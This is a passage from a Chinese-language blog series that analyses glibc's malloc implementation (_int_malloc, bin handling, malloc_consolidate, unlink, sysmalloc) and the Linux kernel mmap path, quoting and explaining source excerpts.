总结下面简单总结一遍_int_malloc函数的整体思路。第一步：如果进程没有关联的分配区，就通过sysmalloc从操作系统分配内存。第二步：从fastbin查找对应大小的chunk并返回，如果失败进入第三步。第三步：从smallbin查找对应大小的chunk并返回，或者将fastbin中的空闲chunk合并放入unsortedbin中，如果失败进入第四步。第四步：遍历unsortedbin，从unsortedbin中查找对应大小的chunk并返回，根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。进入第五步。第五步：从largebin指定位置查找对应大小的chunk并返回，如果失败进入第六步。第六步：从largebin中大于指定位置的双向链表中查找对应大小的chunk并返回，如果失败进入第七步。第七步：从topchunk中分配对应大小的chunk并返回，topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk，如果有，就合并fastbin中的chunk并加入到unsortedbin中，然后跳回第四步。如果fastbin中没有空闲chunk，就通过sysmalloc从操作系统分配内存。","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"malloc源码分析——3","date":"2018-05-21T06:40:59.000Z","path":"2018/05/21/malloc源码分析——3/","text":"malloc源码分析—_int_malloc上一章分析了_int_malloc的前面一小部分，本章继续往下看， _int_malloc — fastbin123456789101112131415161718192021222324252627282930static void * _int_malloc(mstate av, size_t bytes) &#123; ... if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index(nb); mfastbinptr *fb = &amp;fastbin(av, idx); mchunkptr pp = *fb; do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim); if (victim != 0) &#123; if (__builtin_expect(fastbin_index (chunksize (victim)) != idx, 0)) &#123; errstr = &quot;malloc(): memory corruption (fast)&quot;; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125;check_remalloced_chunk (av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; &#125; ...&#125; get_max_fast返回fastbin可以存储内存的最大值，它在ptmalloc的初始化函数malloc_init_state中定义，后面会分析这个函数。如果需要分配的内存大小nb落在fastbin的范围内，首先调用fastbin_index获得chunk大小nb对应的fastbin索引。 12#define fastbin_index(sz) \\ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) 减2是根据fastbin存储的内存最小值计算的，本章假设SIZE_SZ=4，因此改写后idx = nb/8-2。获得索引idx后，就通过fastbin取出空闲chunk链表指针，mfastbinptr其实就是malloc_chunk指针， 1#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx]) 下面的do、while循环又是一个CAS操作，其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)。这里注意，fastbin中使用的是单链表，而后面smallbin使用的是双链表。获得空闲chunk后，需要转换为可以存储的内存指针，chunk2mem上一章分析过了，就是返回malloc_chunk结构中fd所在的位置，因为当一个chunk被使用时，malloc_chunk结构中fd、bk包括后面的变量都没有用了。最后调用alloc_perturb对用户使用的内存进行初始化，然后就返回该内存的指针了。假设fastbin中没有找到空闲chunk，或者fastbin根本没有初始化，或者其他原因，就进入下一步，从smallbin中获取内存，因此继续往下看. _int_malloc — smallbin &amp; largebin1234567891011121314151617181920212223242526272829303132333435363738static void * _int_malloc(mstate av, size_t bytes) &#123; ... if (in_smallbin_range(nb)) &#123; idx = smallbin_index(nb); bin = bin_at (av, idx); if ((victim = last(bin)) != bin) &#123; if (victim == 0) malloc_consolidate(av); else &#123; bck = victim-&gt;bk; if (__glibc_unlikely(bck-&gt;fd != victim)) &#123; errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout; &#125; set_inuse_bit_at_offset(victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; &#125; &#125;else &#123; idx = largebin_index(nb); if (have_fastchunks(av)) malloc_consolidate(av); &#125; ...&#125; 首先 12#define in_smallbin_range(sz) \\ ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE) 基于本章假设，MIN_LARGE_SIZE经过换算后为512字节，因此低于512字节大小的内存块都归smallbin管理。接下来通过bin_at获得smallbin空闲chunk链表指针， 123#define bin_at(m, i) \\ (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2])) \\ - offsetof (struct malloc_chunk, fd)) 这里乘2，并且减去fd相对于malloc_chunk中的位置是因为smallbin中存储的是fd和bk指针。last定义为 1#define last(b) ((b)-&gt;bk) 该函数获得chunk的前一个chunk，由因为该chunk是smallbin的链表头，因此获得的是最后一个chunk，如果两者相等，表示对应的链表为空，什么都不做。这里假设不相等，接下来有两种情况，第一种是victim=0，表示smallbin还没有初始化，这里需要特别说明一下这里。smallbin初始化为malloc_chunk指针数组，虽然定义为指针数组，但实际上存储的是fd和bk指针，如下所示|fd|bk|fd|bk|…|fd|bk|当smallbin还未初始化时，假设idx=1，根据bin_at取出的bin是一个虚拟的malloc_chunk指针，bin-&gt;fd，是第二个fd，因此bin-&gt;bk就是对应的bk，其值为0（bin-&gt;bk取出的不是地址，而是值）。因此当victim为0时，可以断定smallbin未初始化，此时调用malloc_consolidate进行初始化， 12345678910111213static void malloc_consolidate(mstate av) &#123; ... if (get_max_fast () != 0) &#123; ... &#125; else &#123; malloc_init_state(av); check_malloc_state(av); &#125;&#125; 省略代码的if语句里是将fastbin中的chunk进行合并，然后添加到bins中，这里不分析，因为还未初始化，因此get_max_fast返回0，后面的章节碰到了再分析。进入else部分，check_malloc_state为空函数，malloc_init_state就是主要的初始化函数， 12345678910111213141516171819static void malloc_init_state(mstate av) &#123; int i; mbinptr bin; for (i = 1; i &lt; NBINS; ++i) &#123; bin = bin_at (av, i); bin-&gt;fd = bin-&gt;bk = bin; &#125;#if MORECORE_CONTIGUOUS if (av != &amp;main_arena)#endif set_noncontiguous(av); if (av == &amp;main_arena) set_max_fast(DEFAULT_MXFAST); av-&gt;flags |= FASTCHUNKS_BIT; av-&gt;top = initial_top (av);&#125; 该函数做了四件事情，第一是初始化malloc_state中的bins数组，初始化的结果是对bins数组中的每一个fd和对应的bk，都初始化为fd的地址，即fd=bk=&amp;fd；第二是设置fastbin可管理的内存块的最大值，即global_max_fast，DEFAULT_MXFAST定义为， 1#define DEFAULT_MXFAST (64 * SIZE_SZ / 4) 本章假设为64，set_max_fast定义为 123#define set_max_fast(s) \\ global_max_fast = (((s) == 0) \\ ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK)) 第三是设置一些标志位；第四是初始化分配去中的top chunk，就是一个malloc_chunk指针，fd保存在bins[0]中（smallbin中不使用bins[0]和bins[1]）。重新回到_int_malloc中，假设victim不为0，下面就从双向链表中取出victim，设置其中的标志位，然后返回用户可分配的内存指针。假设smallbin中没有空闲chunk可用，下面就要开始寻找largebin了，largebin_index定义为 1234#define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64 (sz) \\ : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz) \\ : largebin_index_32 (sz)) 根据前面SIZE_SZ的假设，这里largebin_index对应的就是largebin_index_32，定义为 1234567#define largebin_index_32(sz) \\ (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ? 56 + (((unsigned long) (sz)) &gt;&gt; 6) :\\ ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ? 91 + (((unsigned long) (sz)) &gt;&gt; 9) :\\ ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\\ ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\\ ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\\ 126) 这里就不多解释了，如果需要知道sz和索引的对应关系，可以自己计算一下。再接下来have_fastchunks根据标志位判断fastbin中是否有空闲chunk，如果有，就调用malloc_consolidate将这些chunk和并，然后加入到unsortedbin中。 _int_malloc — 合并fastbin下面重新看一下malloc_consolidate函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980static void malloc_consolidate(mstate av) &#123; mfastbinptr* fb; mfastbinptr* maxfb; mchunkptr p; mchunkptr nextp; mchunkptr unsorted_bin; mchunkptr first_unsorted; mchunkptr nextchunk; INTERNAL_SIZE_T size; INTERNAL_SIZE_T nextsize; INTERNAL_SIZE_T prevsize; int nextinuse; mchunkptr bck; mchunkptr fwd; if (get_max_fast () != 0) &#123; clear_fastchunks(av); unsorted_bin = unsorted_chunks(av); maxfb = &amp;fastbin(av, NFASTBINS - 1); fb = &amp;fastbin(av, 0); do &#123; p = atomic_exchange_acq(fb, 0); if (p != 0) &#123; do &#123; check_inuse_chunk(av, p); nextp = p-&gt;fd; size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long ) prevsize)); unlink(av, p, bck, fwd); &#125; if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else clear_inuse_bit_at_offset(nextchunk, 0); first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range(size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ((p = nextp) != 0); &#125; &#125; while (fb++ != maxfb); &#125; else &#123; ... &#125;&#125; 因为ptmalloc前面已经初始化过了，这里直接进入if内部，首先通过clear_fastchunks设置标志位表示fastbin中存在空闲chunk， 1#define clear_fastchunks(M) catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT) 然后通过unsorted_chunks获得bins数组中unsortedbin对应的malloc_chunk指针（其fd和bk指针对应bins[0]和bins[1]）。 1#define unsorted_chunks(M) (bin_at (M, 1)) 再往下，将fastbin中的最大和最小的chunk对应的malloc_chunk指针赋值给maxfb和fb，然后通过do，while循环遍历fastbin中的每个chunk链表，atomic_exchange_acq又是一个CAS操作，该函数取出fb指针，并将原来的chunk链表头指针的值设为0，表示chunk链表空闲了。然后开始进入内层的循环，这里遍历的是每个chunk链表中的每个malloc_chunk指针。接下来首先去除chunk中的PREV_INUSE和NON_MAIN_ARENA标志，为了获得chunk的大小（size中的最低三位被用来作为标志位，并且fastbin中chunk的标志位IS_MMAPPED默认为0）。然后通过chunk_at_offset和chunksize获得下一个chunk以及其大小， 123#define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s)))#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)#define chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS)) 再往下，如果chunk的前一个chunk没在使用中，就合并该chunk与前一个chunk，主要是重新计算malloc_chunk的指针，并调用unlink将前一个chunk从bins数组中删除， 12345678910111213141516171819202122232425262728293031#define unlink(AV, P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (P-&gt;size) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ &quot;corrupted double-linked list (not small)&quot;, \\ P, AV); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\&#125; 简单来说，该宏定义就是将前一个chunk从两个双线链表中删除，fd和bk指针构成的双向链表存在于smallbin和largebin中，fd_nextsize和bk_nextsize指针构成的双向链表只存在于largebin中。再往下，如果相邻的下一个chunk不是top chunk，并且下一个chunk不在使用中，就继续合并，否则，就清除下一个chunk的PREV_INUSE，表示该chunk已经空闲了。然后将刚刚合并完的chunk添加进unsorted_bin中，unsorted_bin也是一个双向链表。如果合并完的chunk属于smallbin的大小，则需要清除fd_nextsize和bk_nextsize，因为smallbin中的chunk不会使用这两个指针。并且通过setHead保证不会有相邻的两个chunk都空闲，并且通过setFoot设置下一个chunk的prev_size。如果相邻的下一个chunk是top chunk，则将合并完的chunk继续合并到top chunk中。至此，malloc_consolidate就分析完了，总结一下，malloc_consolidate就是遍历fastbin中每个chunk链表的每个malloc_chunk指针，合并前一个不在使用中的chunk，如果后一个chunk是top chunk，则直接合并到top chunk中，如果后一个chunk不是top chunk，则合并后一个chunk并添加进unsorted_bin中。 下一章继续往下分析_int_malloc函数。","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"malloc源码分析——2","date":"2018-05-21T06:39:08.000Z","path":"2018/05/21/malloc源码分析——2/","text":"malloc源码分析—_int_malloc根据上一章的分析，malloc会调用__libc_malloc分配内存，__libc_malloc会调用malloc_hook_ini 进行初始化，然后回调__libc_malloc函数，这时候会执行_int_malloc开始分配内存，定义在malloc.c中，因为非常长，这里分段来看， _int_malloc第一部分12345678910111213141516171819202122232425262728293031static void * _int_malloc(mstate av, size_t bytes) &#123; INTERNAL_SIZE_T nb; unsigned int idx; mbinptr bin; mchunkptr victim; INTERNAL_SIZE_T size; int victim_index; mchunkptr remainder; unsigned long remainder_size; unsigned int block; unsigned int bit; unsigned int map; mchunkptr fwd; mchunkptr bck; const char *errstr = NULL; checked_request2size(bytes, nb); if (__glibc_unlikely(av == NULL)) &#123; void *p = sysmalloc(nb, av); if (p != NULL) alloc_perturb(p, bytes); return p; &#125; ... 首先调用checked_request2size将需要分配的内存大小bytes转换为chunk的大小。checked_request2size是个宏定义，主要调用request2size进行计算， 1234#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 为了说明request2size，首先看一下ptmalloc中关于chunk的定义， 1234567891011struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; INTERNAL_SIZE_T size; struct malloc_chunk* fd; struct malloc_chunk* bk; struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 当一个chunk为空闲时，至少要有prev_size、size、fd和bk四个参数，因此MINSIZE就代表了这四个参数需要占用的内存大小；而当一个chunk被使用时，prev_size可能会被前一个chunk用来存储，fd和bk也会被当作内存存储数据，因此当chunk被使用时，只剩下了size参数需要设置，request2size中的SIZE_SZ就是INTERNAL_SIZE_T类型的大小，因此至少需要req+SIZE_SZ的内存大小。MALLOC_ALIGN_MASK用来对齐，因此request2size就计算出了所需的chunk的大小。 传入的参数av是在上一章__libc_malloc中调用arena_get获得的分配去指针，如果为null，就表示没有分配区可用，这时候就直接调用sysmalloc通过mmap获取chunk。 sysmallocsysmalloc的代码很长，但只有前面一小部分是这里需要分析的， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123; mchunkptr old_top; INTERNAL_SIZE_T old_size; char *old_end; long size; char *brk; long correction; char *snd_brk; INTERNAL_SIZE_T front_misalign; INTERNAL_SIZE_T end_misalign; char *aligned_brk; mchunkptr p; mchunkptr remainder; unsigned long remainder_size; size_t pagesize = GLRO(dl_pagesize); bool tried_mmap = false; if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; char *mm; try_mmap: if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) size = ALIGN_UP(nb + SIZE_SZ, pagesize); else size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize); tried_mmap = true; if ((unsigned long) (size) &gt; (unsigned long) (nb)) &#123; mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0)); if (mm != MAP_FAILED) &#123; if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) &#123; assert( ((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == 0); front_misalign = 0; &#125; else front_misalign = (INTERNAL_SIZE_T) chunk2mem( mm) &amp; MALLOC_ALIGN_MASK; if (front_misalign &gt; 0) &#123; correction = MALLOC_ALIGNMENT - front_misalign; p = (mchunkptr) (mm + correction); p-&gt;prev_size = correction; set_head(p, (size - correction) | IS_MMAPPED); &#125; else &#123; p = (mchunkptr) mm; set_head(p, size | IS_MMAPPED); &#125; int new = atomic_exchange_and_add(&amp;mp_.n_mmaps, 1) + 1; atomic_max(&amp;mp_.max_n_mmaps, new); unsigned long sum; sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size; atomic_max(&amp;mp_.max_mmapped_mem, sum); check_chunk (av, p); return chunk2mem(p); &#125; &#125; &#125; if (av == NULL) return 0; ... 首先，可以直接通过mmap分配chunk有两个前提条件，一是需要分配的内存大小大于实用mmap进行分配的阀值mp_.mmap_threshold，二是通过mp_.n_mmaps判断系统还可以有可以使用mmap分配的空间。下面就要计算需要分配多少内存，在前面已经通过request2size计算了需要分配的内存大小，这里为什么还要计算呢？这是因为通过使用mmap直接分配的chunk不需要添加到链表中，因此不存在前后关系，当一个chunk被使用时，不能借用后一个chunk的prev_size字段，这里需要把该字段的长度SIZE_SZ加上。并且这里假设MALLOC_ALIGNMENT == 2 * SIZE_SZ。接下来判断需要分配的内存大小是否会溢出，然后就调用MMAP分配内存，MMAP是一个宏定义，最后就是通过系统调用来分配内存，后面来看这个函数。再往下就是通过set_head在chunk中的size参数里设置标志位，因为chunk是按8字节对齐的，而size标识chunk占用的字节数，所以最后三位是没有用的，ptmalloc将这三位用来作为标志位，这里便是设置其中一个标志位，用来标识该chunk是直接通过mmap分配的。 1#define set_head(p, s) ((p)-&gt;size = (s)) 设置完标志位后，接下来就是设置全局变量_mp，将mp_.n_mmaps加1，表示当前进程通过mmap分配的chunk个数，对应的mp_.max_n_mmaps表示最大chunk个数。mp_.mmapped_mem标识已经通过mmap分配的内存大小，mp_.max_mmapped_mem对应可分配内存的最大值。其中，atomic_exchange_and_addb表示原子加，atomic_max则是原子取最大值。最后，通过chunk2mem返回chunk中内存的起始指针。 1#define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ)) 这里也可以知道，当chunk被使用时，用户是从结构体中的变量fd开始使用内存的。回到_int_malloc函数中，假设通过sysmalloc分配成功，接下来就需要调用alloc_perturb对刚刚分配的内存进行初始化， 1234static void alloc_perturb(char *p, size_t n) &#123; if (__glibc_unlikely(perturb_byte)) memset(p, perturb_byte ^ 0xff, n);&#125; 刚函数没有什么实际意义，所以不管它。 MMAP为了方便分析，这里贴一段调用MMAP的代码， 1mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0)); MMAP在glibc中为宏定义，其定义很长，这里简单将它改写， 1234567891011121314#define INTERNAL_SYSCALL_MAIN_6(name, err, arg1, arg2, arg3, \\ arg4, arg5, arg6) \\ struct libc_do_syscall_args _xv = \\ &#123; \\ (int) (0), \\ (int) (-1), \\ (int) (0) \\ &#125;; \\ asm volatile ( \\ &quot;movl %1, %%eax\\n\\t&quot; \\ &quot;call __libc_do_syscall&quot; \\ : &quot;=a&quot; (resultvar) \\ : &quot;i&quot; (__NR_mmap2), &quot;c&quot; (size), &quot;d&quot; (PROT_READ | PROT_WRITE), &quot;S&quot; (MAP_ANONYMOUS|MAP_PRIVATE), &quot;D&quot; (&amp;_xv) \\ : &quot;memory&quot;, &quot;cc&quot;) __libc_do_syscall是一段汇编代码，最后就是系统调用啦，这里就进入了linux内核中的代码，在arch/x86/entry/syscalls/syscall_32.tbl中有如下定义， 1192 i386 mmap2 sys_mmap_pgoff 因此，MMAP最后调用linux内核中的sys_mmap_pgoff函数，定义在mm/mmap.c中， 12345678910111213141516171819202122SYSCALL_DEFINE6(mmap_pgoff, unsigned long, addr, unsigned long, len, unsigned long, prot, unsigned long, flags, unsigned long, fd, unsigned long, pgoff)&#123; struct file *file = NULL; unsigned long retval = -EBADF; if (!(flags &amp; MAP_ANONYMOUS)) &#123; ... &#125; else if (flags &amp; MAP_HUGETLB) &#123; ... &#125; flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE); retval = vm_mmap_pgoff(file, addr, len, prot, flags, pgoff); return retval;&#125; SYSCALL_DEFINE6是个宏定义，就是将系统调用号和函数联系起来，这里其实就是定义了sys_mmap_pgoff函数。根据前面传入的flags，这里直接跳过判断，因此下面主要就是执行vm_mmap_pgoff函数，定义在mm/utils.c中， 12345678910111213141516171819unsigned long vm_mmap_pgoff(struct file *file, unsigned long addr, unsigned long len, unsigned long prot, unsigned long flag, unsigned long pgoff)&#123; unsigned long ret; struct mm_struct *mm = current-&gt;mm; unsigned long populate; ret = security_mmap_file(file, prot, flag); if (!ret) &#123; down_write(&amp;mm-&gt;mmap_sem); ret = do_mmap_pgoff(file, addr, len, prot, flag, pgoff, &amp;populate); up_write(&amp;mm-&gt;mmap_sem); if (populate) mm_populate(ret, populate); &#125; return ret;&#125; 这里首先获得进程的mm_struct结构，该结构保存了虚拟内存和物理内存的映射关系，security_mmap_file和linux安全有关，这里不关心，因此调用do_mmap_pgoff执行主要的mmap内容，前后加了信号量。do_mmap_pgoff定义在mm/mmap.c中，这里省略了很多不关键的代码， do_mmap_pgoff12345678910111213141516171819202122232425262728293031323334353637unsigned long do_mmap_pgoff(struct file *file, unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long pgoff, unsigned long *populate)&#123; struct mm_struct *mm = current-&gt;mm; vm_flags_t vm_flags; *populate = 0; if (!(flags &amp; MAP_FIXED)) addr = round_hint_to_min(addr); len = PAGE_ALIGN(len); addr = get_unmapped_area(file, addr, len, pgoff, flags); vm_flags = calc_vm_prot_bits(prot) | calc_vm_flag_bits(flags) | mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC; if (file) &#123; ... &#125; else &#123; switch (flags &amp; MAP_TYPE) &#123; case MAP_SHARED: ... break; case MAP_PRIVATE: pgoff = addr &gt;&gt; PAGE_SHIFT; break; default: return -EINVAL; &#125; &#125; addr = mmap_region(file, addr, len, vm_flags, pgoff); return addr;&#125; 传入的flags没有MAP_FIXED，表是映射的地址不固定（这里传入的addr为0），由内核分配。接下来通过调用round_hint_to_min和PAGE_ALIGN对地址和长度进行页对齐，并且检查地址是否溢出或者太小。下面调用get_unmapped_area在进程的用户空间里查找已经分配的虚拟内存。 12345678910111213141516171819unsigned long get_unmapped_area(struct file *file, unsigned long addr, unsigned long len, unsigned long pgoff, unsigned long flags)&#123; unsigned long (*get_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); ... get_area = current-&gt;mm-&gt;get_unmapped_area; ... addr = get_area(file, addr, len, pgoff, flags); if (IS_ERR_VALUE(addr)) return addr; ... return addr;&#125; 这里首先获取get_area函数指针用来查找用户空间中已经分配的虚拟内存，这里根据mmap的方向可以获取到arch_get_unmapped_area_topdown或者arch_get_unmapped_area两个函数指针，其arch_get_unmapped_area_topdown对应的mmap方向是从高地址往低地址方向扩展的，本章还是分析传统的从低地址往高地址拓展对应的arch_get_unmapped_area函数， 12345678910111213141516171819202122232425unsigned longarch_get_unmapped_area(struct file *filp, unsigned long addr, unsigned long len, unsigned long pgoff, unsigned long flags)&#123; struct mm_struct *mm = current-&gt;mm; struct vm_area_struct *vma; struct vm_unmapped_area_info info; unsigned long begin, end; if (flags &amp; MAP_FIXED) return addr; ... if (addr) &#123; addr = PAGE_ALIGN(addr); vma = find_vma(mm, addr); if (end - len &gt;= addr &amp;&amp; (!vma || addr + len &lt;= vma-&gt;vm_start)) return addr; &#125; ...&#125; 首先，如果是固定地址映射，直接返回addr地址。本章分析的不是这种情况，省略的代码和一些随机映射有关，这里省略了不分析。这样就进入了底下的if语句里，对地址对齐后，就调用find_vma查找addr地址开始已经分配出去的虚拟内存vma，最后addr到addr+len这个地址范围内没有虚拟内存，就将地址返回。 123456789101112131415161718192021222324252627282930struct vm_area_struct *find_vma(struct mm_struct *mm, unsigned long addr)&#123; struct rb_node *rb_node; struct vm_area_struct *vma; vma = vmacache_find(mm, addr); if (likely(vma)) return vma; rb_node = mm-&gt;mm_rb.rb_node; vma = NULL; while (rb_node) &#123; struct vm_area_struct *tmp; tmp = rb_entry(rb_node, struct vm_area_struct, vm_rb); if (tmp-&gt;vm_end &gt; addr) &#123; vma = tmp; if (tmp-&gt;vm_start &lt;= addr) break; rb_node = rb_node-&gt;rb_left; &#125; else rb_node = rb_node-&gt;rb_right; &#125; if (vma) vmacache_update(addr, vma); return vma;&#125; 这里就不往下继续看代码的，简单来说，进程已经分配的虚拟内存保存在一个红黑树中，红黑树简单的作用就是防止一个树结构不平衡，出现某个左子树严重大于右子树的情况。为了加快查找的速度，这里设立了缓存。通过观察while结构，这里就是查找第一个结束地址大于addr的已经分配的虚拟内存，然后返回。 回到do_mmap_pgoff中，calc_vm_prot_bits和calc_vm_flag_bits用来将prot和flags中的标志位转化为vm的标志位，例如prot中的PROT_READ转化为VM_READ，flags中的MAP_GROWSDOWN转化为VM_GROWSDOWN。根据前面prot和flags中的值，这里转化后，vm_flags为VM_READ|VM_WRITE|mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC。最后就调用mmap_region构造一个vma用来保存刚刚获得的虚拟内存。 mmap_region为了方便分析和查看，这里对mmap_region代码做了适当的删除和改写， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859unsigned long mmap_region(struct file *file, unsigned long addr, unsigned long len, vm_flags_t vm_flags, unsigned long pgoff)&#123; struct mm_struct *mm = current-&gt;mm; struct vm_area_struct *vma, *prev; int error; struct rb_node **rb_link, *rb_parent; unsigned long charged = 0; if (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT)) &#123; ... &#125; error = -ENOMEM; while (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link, &amp;rb_parent)) &#123; if (do_munmap(mm, addr, len)) return -ENOMEM; &#125; vm_flags |= VM_ACCOUNT; vma = vma_merge(mm, prev, addr, addr + len, vm_flags, NULL, file, pgoff, NULL); if (vma) goto out; vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL); vma-&gt;vm_mm = mm; vma-&gt;vm_start = addr; vma-&gt;vm_end = addr + len; vma-&gt;vm_flags = vm_flags; vma-&gt;vm_page_prot = vm_get_page_prot(vm_flags); vma-&gt;vm_pgoff = pgoff; INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain); vma_link(mm, vma, prev, rb_link, rb_parent);out: vm_stat_account(mm, vm_flags, file, len &gt;&gt; PAGE_SHIFT); if (vm_flags &amp; VM_LOCKED) &#123; if (!((vm_flags &amp; VM_SPECIAL) || is_vm_hugetlb_page(vma) || vma == get_gate_vma(current-&gt;mm))) mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT); else vma-&gt;vm_flags &amp;= ~VM_LOCKED; &#125; if (file) uprobe_mmap(vma); vma-&gt;vm_flags |= VM_SOFTDIRTY; vma_set_page_prot(vma); return addr;&#125; may_expand_vm用于判断加上即将分配的虚拟内存，是否超过了系统的限制，如果超过了就需要进行相应的操作或者返回错误，这里假设不会超过系统限制，不管它。find_vma_links的定义如下， 1234567891011121314151617181920212223242526272829303132static int find_vma_links(struct mm_struct *mm, unsigned long addr, unsigned long end, struct vm_area_struct **pprev, struct rb_node ***rb_link, struct rb_node **rb_parent)&#123; struct rb_node **__rb_link, *__rb_parent, *rb_prev; __rb_link = &amp;mm-&gt;mm_rb.rb_node; rb_prev = __rb_parent = NULL; while (*__rb_link) &#123; struct vm_area_struct *vma_tmp; __rb_parent = *__rb_link; vma_tmp = rb_entry(__rb_parent, struct vm_area_struct, vm_rb); if (vma_tmp-&gt;vm_end &gt; addr) &#123; if (vma_tmp-&gt;vm_start &lt; end) return -ENOMEM; __rb_link = &amp;__rb_parent-&gt;rb_left; &#125; else &#123; rb_prev = __rb_parent; __rb_link = &amp;__rb_parent-&gt;rb_right; &#125; &#125; *pprev = NULL; if (rb_prev) *pprev = rb_entry(rb_prev, struct vm_area_struct, vm_rb); *rb_link = __rb_link; 